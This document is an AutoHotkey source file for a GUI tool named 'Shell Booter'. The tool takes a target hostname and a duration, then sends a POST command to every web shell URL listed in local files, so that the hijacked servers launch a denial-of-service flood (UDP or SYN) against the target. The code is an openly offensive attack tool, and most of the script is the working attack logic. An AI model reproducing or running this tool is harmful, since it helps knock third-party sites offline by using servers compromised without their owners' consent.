#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

; Local SQLite database that stores the shells (Check into)
; http://www.autohotkey.com/board/topic/71179-ahk-l-dba-16-oop-sql-database-sqlite-mysql-ado/

#Include Includes/_httpquery.ahk
#Include Includes/_tf.ahk

; =====================================================================
; Read our database and update the listbox view with all the shells
; =====================================================================
FileRead, ShellListBoxData, post.txt
DatabasePOST:=TF_CountLines("post.txt")
DatabaseGET:=TF_CountLines("get.txt")

; =====================================================================
; Master GUI
; =====================================================================
Gui, Color, FFFFFFF
Gui, Add, Edit, x12 y100 w420 h20 vTargetHostname c303030,
Gui, Add, Button, x442 y100 w40 h20 gAttackGo, Go
Gui, Add, Edit, x12 y150 w470 h190 ReadOnly vShellListBox c303030, %ShellListBoxData%
Gui, Add, GroupBox, x12 y350 w280 h70 , Settings
Gui, Add, Radio, x22 y370 w70 h20 vProtocolUDP, UDP
Gui, Add, Radio, x22 y390 w70 h20 vProtocolTCP, SYN
Gui, Add, Radio, x92 y370 w140 h20 vNormalHeaders, Normal HTTP headers
Gui, Add, Radio, x92 y390 w140 h20 vCustomHeaders, Custom HTTP headers
Gui, Add, Text, x12 y130 w90 h20 , Shells in database:
Gui, Add, Text, x12 y80 w90 h20 , Hostname:
Gui, Add, GroupBox, x302 y350 w180 h70 , Shells
Gui, Add, Text, x400 y370 w80 h20 vPOSTShells, % DatabasePOST
Gui, Add, Text, x400 y390 w80 h20 vGETShells, % DatabaseGET
Gui, Add, Edit, x232 y370 w50 h20 vTime, Time
Gui, Add, Edit, x232 y390 w50 h20 vPort, Port
Gui, Add, Picture, x210 y20 w64 h64 , ico.png
Gui, Add, Text, x22 y465 w450 h40 c303030 vMessageOfTheDay, Lorem ipsum dolor sit amet`, consectetur adipiscing elit. Vestibulum vulputate enim ac lacus varius`, vitae vehicula tortor vulputate. Vivamus sed mattis arcu. Maecenas eu ligula arcu.
Gui, Add, Button, x382 y550 w100 h20 gLogOut, Logout
Gui, Font, S8 CDefault Bold, Verdana
Gui, Add, GroupBox, x12 y430 w470 h90 , Message of the day
Gui, Add, Text, x312 y370 w70 h20 , POST:
Gui, Add, Text, x312 y390 w70 h20 , GET:
Gui, Show, x287 y155 h588 w496 Center, Shell Booter
ShellListBoxData =
Return

; =====================================================================
; Execute attack v 0.0.0.1
; URL http://127.0.0.1/autohotkey/php.php?command=php&host=127.0.0.1&time=1
;
; =====================================================================

AttackGo:

GuiControlGet , TargetHostname,
GuiControlGet , Time,

if(TargetHostname = "")
{
	Msgbox,0x30,Oops, Oops! Something went wrong.`n`nYou have to specify Hostname.
	Return
}
else if (Time = "Time")
{
	Msgbox,0x30,Oops, Oops! Something went wrong.`n`nYou have to specify Time.
	Return
}

;http://127.0.0.1/autohotkey/php.php?command=php&host=127.0.0.1&time=1
POSTdata := "command=php&host=" . TargetHostname . "&time=" . Time

Loop, Read, post.txt
{
   URL := A_LoopReadLine
   Msgbox, % URLPost(URL . POSTdata, "")
}
Return

; =====================================================================
; Other Functions
; =====================================================================
UrlPost(URL, data) {
   WebRequest := ComObjCreate("WinHttp.WinHttpRequest.5.1")
   WebRequest.Open("POST", URL, false)
   WebRequest.Send(data)
   Return WebRequest.ResponseText
}

; =====================================================================
; Logout v 0.0.0.1
; =====================================================================
LogOut:
Reload
Return

; =====================================================================
; GuiClose
; =====================================================================
GuiClose:
ExitApp

; =====================================================================
; Hotkeys during programming
; =====================================================================
F12::Reload

